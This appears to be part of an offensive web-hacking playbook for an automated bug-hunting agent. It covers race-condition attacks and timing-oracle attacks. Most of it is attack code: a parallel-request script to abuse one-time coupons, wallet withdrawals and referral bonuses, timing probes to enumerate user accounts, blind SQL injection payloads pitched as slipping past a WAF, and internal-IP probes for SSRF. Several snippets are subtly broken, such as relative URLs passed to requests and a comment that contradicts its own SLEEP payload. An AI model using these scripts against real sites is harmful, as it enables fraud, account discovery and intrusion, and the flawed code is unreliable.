# ZDH Phase 10, 21: Race Conditions + Timing Oracle Attacks

## Phase 10 - Race Conditions & TOCTOU

**Goal:** Exploit the gap between "check" and "use" to double-spend, bypass limits, or duplicate resources.

```python
import asyncio, aiohttp

async def race(session, url, data):
    async with session.post(url, json=data) as r:
        return await r.json()

async def race_attack(url, data, count=20):
    async with aiohttp.ClientSession() as session:
        # Fire ALL requests at exact same moment
        tasks = [race(session, url, data) for _ in range(count)]
        results = await asyncio.gather(*tasks)
        return results

# Key race condition targets in e-commerce:
# 1. One-time coupon codes - use same code 20x simultaneously
#    -> Some requests succeed before server marks code as used
# 2. "Limited quantity" items - buy 20 units of 1-remaining item simultaneously
# 3. Referral bonus - claim bonus 20x in parallel
# 4. Password reset tokens - try to use same token from multiple IPs simultaneously
# 5. Rate limit bypass - 50 "forgot password" in one burst
# 6. Wallet/balance operations - withdraw simultaneously from two sessions

# Burp Suite: Turbo Intruder -> race_single_packet_attack.py
# HTTP/2 single packet attack: sends all requests in ONE TCP packet -> true simultaneity
```

## Phase 21 - Timing Oracle Attacks

**Invisible to scanners. Use timing to confirm blind vulnerabilities without triggering WAF.**

```python
import time, statistics, requests

def timed_request(url, payload, headers=None):
    start = time.perf_counter()
    r = requests.get(url, params=payload, headers=headers, timeout=10)
    return time.perf_counter() - start, r

# 1. User enumeration via timing
# Valid user: server checks password (slow). Invalid user: server rejects immediately (fast).
valid_times   = [timed_request("/login", {"email": "known@target.com", "pass": "wrong"})[0] for _ in range(10)]
invalid_times = [timed_request("/login", {"email": "xxxnotexist@target.com", "pass": "wrong"})[0] for _ in range(10)]
print(f"Valid mean: {statistics.mean(valid_times):.4f}s")
print(f"Invalid mean: {statistics.mean(invalid_times):.4f}s")
# >20ms difference = user enumeration confirmed

# 2. Blind SQLi via timing (no SLEEP keyword needed, works through WAF)
baseline = timed_request("/search", {"q": "test"})[0]
heavy_q  = timed_request("/search", {"q": "test' AND (SELECT * FROM (SELECT(SLEEP(0)))x)--"})[0]
# NOT using SLEEP keyword. Instead:
heavy_q2 = timed_request("/search", {"q": "test' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 100000)--"})[0]
# If response time increases proportionally = blind SQLi confirmed

# 3. Blind SSRF timing confirmation
# Send SSRF to internal IP that exists vs one that doesn't
# Internal IP that exists: TCP handshake delay (fast timeout or connects)
# Non-existent: ICMP unreachable (instant)
existing_ip_time = timed_request("/fetch", {"url": "http://10.x.x.x/"})[0]  # use IP from recon
nonexist_ip_time = timed_request("/fetch", {"url": "http://10.200.255.254/"})[0]
# Different timing = SSRF confirmed even without OOB callback
```

**Signal:** `emit_signal VULN_CONFIRMED "Race condition: <endpoint> accepts concurrent <action>" "main/zerodayhunt" 0.87`
